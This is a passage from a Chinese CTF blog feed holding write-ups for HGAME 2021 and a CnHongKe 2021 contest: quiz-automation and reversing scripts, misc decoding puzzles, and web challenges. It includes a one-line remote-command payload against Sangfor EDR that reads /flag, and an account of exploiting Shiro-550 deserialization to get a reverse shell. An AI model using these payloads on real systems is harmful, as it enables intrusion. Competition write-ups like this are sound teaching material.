class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>应该是通过<code>./api/getStatus</code>检查做题情况，<code>./api/getQuestion</code>加载题目，<code>./api/verify</code>交答案，最后<code>./api/getFlag</code>拿flag</p><p>直接访问<code>./api/getFlag</code>看看？</p><img src="/article/hgame2021/image-20210206162746009.png" class="" title="image-20210206162746009" loading="lazy"><p>被骂了555…应该是检查session看做题情况，其他都访问一下看看</p><img src="/article/hgame2021/image-20210206162926231.png" class="" title="image-20210206162926231" loading="lazy"><img src="/article/hgame2021/image-20210206162952785.png" class="" title="image-20210206162952785" loading="lazy"><p>最后确认答案是<code>answer</code>，开始写脚本</p><img src="/article/hgame2021/image-20210206163154279.png" class="" title="image-20210206163154279" loading="lazy"><p>赶时间，没搞正则，凑合着用用吧，蹩脚编程勿喷2333</p><p>payload:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/30 21:20@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> integrate<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000"</span><span class="token comment"># print(requests.get(url))</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">jifen</span><span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>    A <span class="token operator">=</span> integrate<span class="token punctuation">(</span>a <span class="token operator">*</span> x <span class="token operator">+</span> b<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> shangxian<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> A<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"get"</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\"question\":\"&lt;math>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/math>\"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;mrow>"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span>    xiaxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(xiaxian)</span>    shangxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/msubsup>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                           <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(shangxian)</span>    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mi>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(a)</span>    b <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(b)</span>    ans <span class="token operator">=</span> jifen<span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    upans <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>upans<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        run<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(session.cookies)</span></code></pre><p>一 键 获 取 flag</p><img src="/article/hgame2021/image-20210206163540205.png" class="" title="image-20210206163540205" loading="lazy"><hr><h3 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h3><p>题目描述：</p><p> <strong>本题为宝藏走私者的更改版本，考点相同，请先做出宝藏走私者</strong><br>Liki 日记：<br>2020年2月2日：<br>今天警局寄来一封信，是走私者 Switch 寄来的，信里只有一句话<br><strong>“我最讨厌顺风车，我将带来我的愤怒”</strong><br>真是让人摸不着头脑……<br>我看不懂，但我大受震撼。 </p><p>题目描述： <a href="http://police.liki.link/">http://police.liki.link</a> </p><p>原因是web3能上车了2333</p><p>相同payload，改改host就行</p><img src="/article/hgame2021/QQ%E5%9B%BE%E7%89%8720210206163759.png" class="" title="QQ图片20210206163759" loading="lazy"><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>misc随缘做做了，一周三场比赛有点忙</p><hr><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>题目描述：</p><p>新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09<br><strong>本次比赛为招新赛，请各位选手不要在当周比赛进行期间至结束后24小时内发布当周比赛题目的writeup</strong> </p><p>题目地址：<a href="https://www.baidu.com/">https://www.baidu.com</a> 很强啊</p><p>base64+base32+base16 不解释</p><hr><p>吐槽下MISC2</p><p>压缩包密码知道是啥嘛？</p><img src="/article/hgame2021/1.jpg" class="" width="1" loading="lazy"><p>23333没错就是的</p><p>misc3好像是流量包，能提出来一张几M的图片，分析图片</p><hr><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>题目描述： timmix不知所踪，只留下了两个word文档，作为word专家的你能帮忙找出他的去向吗？ </p><p>题目链接：<a href="https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip">https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip</a></p><p>其实我以前出过一个Word的Misc，有人记得嘛2333</p><p>两个word文档，先看属性</p><img src="/article/hgame2021/image-20210206164905132.png" class="" title="image-20210206164905132" loading="lazy"><p>估计另一个有密码，直接以压缩包形式打开</p><p>很轻易有个<code>word/password.xml</code></p><img src="/article/hgame2021/image-20210206165015840.png" class="" title="image-20210206165015840" loading="lazy"><pre class="language-none"><code class="language-none">&lt;password&gt;+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;&lt;&#x2F;password&gt;</code></pre><p>很显然brainfuck</p><p>解密网站<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>解得<code>DOYOUKNOWHIDDEN?</code></p><p>开第二个文档，分析了一下什么都没有，文档只有一张图片</p><img src="/article/hgame2021/image-20210206165425076.png" class="" title="image-20210206165425076" loading="lazy"><p>选中文档发现不对劲，显示隐藏标记发现有隐藏字符，把字符取消隐藏</p><img src="/article/hgame2021/image-20210206170404252.png" class="" title="image-20210206170404252" loading="lazy"><p>发现是空白的，单独保存下来</p><img src="/article/hgame2021/image-20210206170505833.png" class="" title="image-20210206170505833" loading="lazy"><p>结合图片跟雪有关，可能是snow加密，去跑一下试试</p><img src="/article/hgame2021/image-20210206170631851.png" class="" title="image-20210206170631851" loading="lazy"><p>确实</p><hr><p>其他题目可以等官方或者PWN师傅的WP啦，每次做题不管简单还是困难都要有所收获，week2师傅们也要加油！提前祝师傅们新年快乐！</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CnHongKe2021公测赛</title>
      <link href="article/2021gongcesai/"/>
      <url>article/2021gongcesai/</url>
      
        <content type="html"><![CDATA[<p>2月5日</p><p>比赛情况：</p><img src="/article/2021gongcesai/image-20210205133228513.png" class="" title="rank" loading="lazy"><p>小比赛</p><a id="more"></a><img src="/article/2021gongcesai/image-20210205133840182.png" class="" title="rank" loading="lazy"><p>主办方平台关太快了2333，睡了一觉起来连平台都没了</p><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>PHP CGI解析漏洞出现的原因是（ ）</p><ul><li><p>A.cgi.fix_pathi配置错误</p></li><li><p>B.cgi.fix_pathinfo配置错误</p></li><li><p>C.phpinfo配置错误</p></li><li><p>D.cgi.fix__status_en配置错误</p></li></ul><p>很显然是<code>cgi.fix_pathinfo</code>配置错误，当设置了cgi.fix_pathinfo = 1时，PHP就会以’/‘为分割符从最后一个文件开始向前找存在的文件去执行，例如<code>/upload/a.jpg/b.php</code>.</p><hr><h3 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h3><p>扫码得flag</p><img src="/article/2021gongcesai/image-20210205172001695.png" class="" title="image-20210205172001695" loading="lazy"><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>深信服载入史册</p><p>直接payload打</p><img src="/article/2021gongcesai/image-20210205134031474.png" class="" title="image-20210205134031474" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;?strip_slashes&#x3D;system&amp;host&#x3D;cat &#x2F;flag</code></pre><p>这题去年有过，是作为线下赛的题目，当时没外网，只能硬审，或者…<del>记得payload</del>，毕竟太有名了…</p><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Shiro remeberMe反序列化漏洞（Shiro-550）</p><p>用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞</p><img src="/article/2021gongcesai/image-20210205135031033.png" class="" title="image-20210205135031033" loading="lazy"><p>可以如 <a href="https://www.cnblogs.com/sup3rman/archive/2020/07/16/13322898.html">参考文章</a> 所示，利用<code>shiro.py</code>生成payload</p><img src="/article/2021gongcesai/image-20210205135241419.png" class="" title="image-20210205135241419" loading="lazy"><p>当然后来才发现更简单的，直接用 <code>ShiroScan</code> 工具，可以用DNSlog的方式，也可以反弹shell，这里直接反弹shell</p><img src="/article/2021gongcesai/image-20210205135442119.png" class="" title="image-20210205135442119" loading="lazy"><p>成功弹到shell</p><img src="/article/2021gongcesai/image-20210205135511988.png" class="" title="image-20210205135511988" loading="lazy"><hr><h3 id="fast-x-3"><a href="#fast-x-3" class="headerlink" title="fast x 3"></a>fast x 3</h3><p>老脚本大师了</p><img src="/article/2021gongcesai/image-20210205135615967.png" class="" title="image-20210205135615967" loading="lazy"><p>写个py脚本即可，直接上payload，蹩脚编程，师傅们见谅…</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/5 9:22@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> collectionsurl <span class="token operator">=</span> <span class="token string">"http://180.109.90.207:23891/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>responses <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>responses<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"1--------------------------------取字符串"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> responses<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;divid=\"math\">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"2--------------------------------计数"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span>cal<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"3--------------------------------排序"</span><span class="token punctuation">)</span><span class="token keyword">from</span> collections <span class="token keyword">import</span> OrderedDictstr2 <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"4--------------------------------取key"</span><span class="token punctuation">)</span>val <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    val <span class="token operator">+=</span> ival <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"5--------------------------------赋data"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"6--------------------------------提交"</span><span class="token punctuation">)</span>post_responses <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_responses<span class="token punctuation">)</span></code></pre><p>编编改改凑合用</p><img src="/article/2021gongcesai/image-20210205140020576.png" class="" title="image-20210205140020576" loading="lazy"><hr><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><h3 id="Des"><a href="#Des" class="headerlink" title="Des"></a>Des</h3><p>2015ISCC的题目改题<code>没有题目的题目</code></p><p>主要代码</p><pre class="language-none"><code class="language-none">public boolean check() &#123;     byte[] b2 &#x3D; &#123;103, 112, 111, 49, 61, 113, 117, 109, 76, 108, 77, 57, 59, 90, 64, 105, 33, 89, 74, 113, 92, 84, 87, 113, 105, 65, 35, 74, 93, 73, 43, 120&#125;;     byte[] b3 &#x3D; this.result1.getBytes();     for (int j &#x3D; 0; j &lt; b3.length; j++) &#123;         Log.d(&quot;test&quot;, ((byte) (b3[j] ^ j)));     &#125;     if (b3.length !&#x3D; b2.length) &#123;         return false;     &#125;     for (int j2 &#x3D; 0; j2 &lt; b2.length; j2++) &#123;         if ((b3[j2] ^ b2[j2]) !&#x3D; j2) &#123;             return false;         &#125;     &#125;     return true; &#125;</code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64V0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">DeCheck</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    xx <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>v1<span class="token punctuation">)</span>    <span class="token comment">##print xx</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'ilovedes'</span>    iv <span class="token operator">=</span> <span class="token string">'\x01\x02\x03\x04\x05\x06\x07\x08'</span>    k <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    flag <span class="token operator">=</span> k<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>DeCheck<span class="token punctuation">(</span>V0<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Your flag is: "</span> <span class="token operator">+</span> flag</code></pre><img src="/article/2021gongcesai/image-20210205140432528.png" class="" title="image-20210205140432528" loading="lazy"><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205171005.jpg" class="" title="QQ图片20210205171005" loading="lazy"><p>参考链接：<a href="http://bobao.360.cn/ctf/learning/136.html">http://bobao.360.cn/ctf/learning/136.html</a></p><hr><h2 